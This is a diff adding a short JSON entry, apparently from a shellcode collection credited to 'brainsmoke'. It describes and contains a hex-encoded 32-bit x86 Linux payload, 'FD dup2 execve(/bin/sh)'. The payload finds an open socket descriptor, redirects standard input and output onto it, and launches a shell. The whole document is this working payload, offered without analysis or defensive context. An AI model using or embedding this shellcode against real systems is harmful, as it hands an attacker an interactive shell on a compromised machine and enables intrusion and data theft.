@@ -1,0 +1,5 @@
+{
+	"description" : "FD dup2 execve(/bin/sh)",
+	"author"      : "brainsmoke",
+	"code"        : "54596a7f54516a7f54596a075bff096a6658cd8085c075f55b6a02596a3f58cd804979f84131d251686e2f7368682f2f626989e36a0b58cd80"
+}
